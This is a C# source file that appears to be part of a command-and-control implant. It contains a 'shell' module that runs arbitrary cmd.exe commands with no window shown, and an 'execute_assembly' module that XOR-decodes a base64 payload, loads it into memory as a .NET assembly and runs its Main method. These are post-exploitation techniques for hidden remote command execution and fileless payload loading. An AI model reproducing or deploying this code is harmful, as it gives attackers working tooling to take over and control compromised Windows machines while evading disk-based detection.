using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;

namespace Execution
{
    public class Shell
    {
        public string Name => "shell";

        public string Execute(string[] args)
        {
            var results = "";

            var startInfo = new ProcessStartInfo
            {
                FileName = @"C:\Windows\System32\cmd.exe",
                Arguments = $"/c {args[0]}",
                WorkingDirectory = Directory.GetCurrentDirectory(),
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true,
            };

            var process = Process.Start(startInfo);

            using (process.StandardOutput)
            {
                results += process.StandardOutput.ReadToEnd();
            }

            using (process.StandardError)
            {
                results += process.StandardError.ReadToEnd();
            }

            return results;
        }
    }

    public class ExecuteAssembly
    {
        public string Name => "execute_assembly";

        public string Execute(string[] args)
        {
            var base64_encoded_assembly = args[0];
            var key = args[1];
            byte[] assembly_bytes = Zor(Convert.FromBase64String(base64_encoded_assembly), key);
            Assembly assembly;
            try
            {
                assembly = Assembly.Load(assembly_bytes);
            }
            catch (Exception ex)
            {
                return ex.ToString();
            }

            try
            {
                Type[] types = assembly.GetExportedTypes();
                object methodOutput;
                foreach (Type type in types)
                {
                    foreach (MethodInfo method in type.GetMethods())
                    {
                        if (method.Name == "Main")
                        {
                            //Redirect output from C# assembly (such as Console.WriteLine()) to a variable instead of screen
                            TextWriter prevConOut = Console.Out;
                            var sw = new StringWriter();
                            Console.SetOut(sw);

                            object instance = Activator.CreateInstance(type);
                            methodOutput = method.Invoke(instance, new object[] { SliceArray(args, 2, args.Length - 1) });

                            //Restore output -- Stops redirecting output
                            Console.SetOut(prevConOut);
                            string strOutput = sw.ToString();

                            // Try catch this just in case the assembly we invoke doesn't have an (int) return value
                            // otherwise the program would explode
                            try
                            {
                                methodOutput = (int)methodOutput;
                            }
                            catch
                            {
                                methodOutput = 0;
                            }
                            return strOutput;
                        }
                    }
                }
                return $"Could not find the method Main in the assembly.";
            }
            catch (Exception ex)
            {
                return ex.ToString();
            }
        }

        private static byte[] Zor(byte[] input, string key)
        {
            int _key = Int32.Parse(key);
            byte[] mixed = new byte[input.Length];
            for (int i = 0; i < input.Length; i++)
            {
                mixed[i] = (byte)(input[i] ^ _key);
            }
            return mixed;
        }

        private static string[] SliceArray(string[] inputArray, int startIndex, int endIndex)
        {
            int length = endIndex - startIndex + 1;
            string[] outputArray = new string[length];
            Array.Copy(inputArray, startIndex, outputArray, 0, length);
            return outputArray;
        }
    }
}
